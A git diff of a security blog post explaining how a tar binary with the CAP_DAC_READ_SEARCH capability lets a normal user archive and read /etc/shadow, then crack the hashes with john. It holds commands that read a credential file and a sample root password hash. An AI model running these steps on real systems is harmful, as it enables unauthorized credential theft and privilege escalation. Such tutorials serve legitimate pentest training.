@@ -1,6 +1,6 @@
 ---
 layout: post
-title: Abusing /tar to escalate privileges
+title: Abusing /tar capabilities to escalate privileges
 date: 2023-05-13 00:12 +0000
 comments: active
 categories: [Privilege Escalation]
@@ -39,7 +39,7 @@ If it is vulnerable, you will see one of the following:
 
 ## Privilege escalation process  
 ### CAP_DAC_READ_SEARCH Method
-***CAP_DAC_READ_SEARCH*** allows binaries to *bypass file read, and directory read and execute permissions.* This means /tar can be used to access sensitive areas of an operating system as a normal user, such as the /etc/shadow file or the /root directory. To create an archive of the /etc/shadow file, you can run the following command:
+***CAP_DAC_READ_SEARCH*** allows binaries to bypass file read, and directory read and execute permissions. This means /tar can be used to access sensitive areas of an operating system as a normal user, such as the /etc/shadow file or the /root directory. To create an archive of the /etc/shadow file, you can run the following command:
 ```bash
 tar -czf /tmp/shadow.tar.gz /etc/shadow
 ```
@@ -51,19 +51,18 @@ The /tar flags are important to understand:
 
 > `-f` : Designated file name
 
-> `-x` : Extract an archive
-
 The file can then be decompressed and printed out to view the hashed passwords:
 ```bash
 gzip -d /tmp/shadow.tar.gz 
 cat /tmp/shadow.tar
 ```
-```text
+```
 root:$6$HbEKQFPH$5qqq6gXYJpsQpk0ZNGD1R/WClLPawMYLuL9Kn.PQE5W4grdRtoopgvgRJZs36A0a7Nwvi4L53B0yiSA.3Hq7k/:19171:0:99999:7::: 
 bin:*:18353:0:99999:7:::
 apache:!!:19171::::::
 ```
-Any shadow hashes can be cracked with john, using the following command:
+{: file="shadow.tar" }
+Shadow hashes can be cracked with john, using the following command:
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
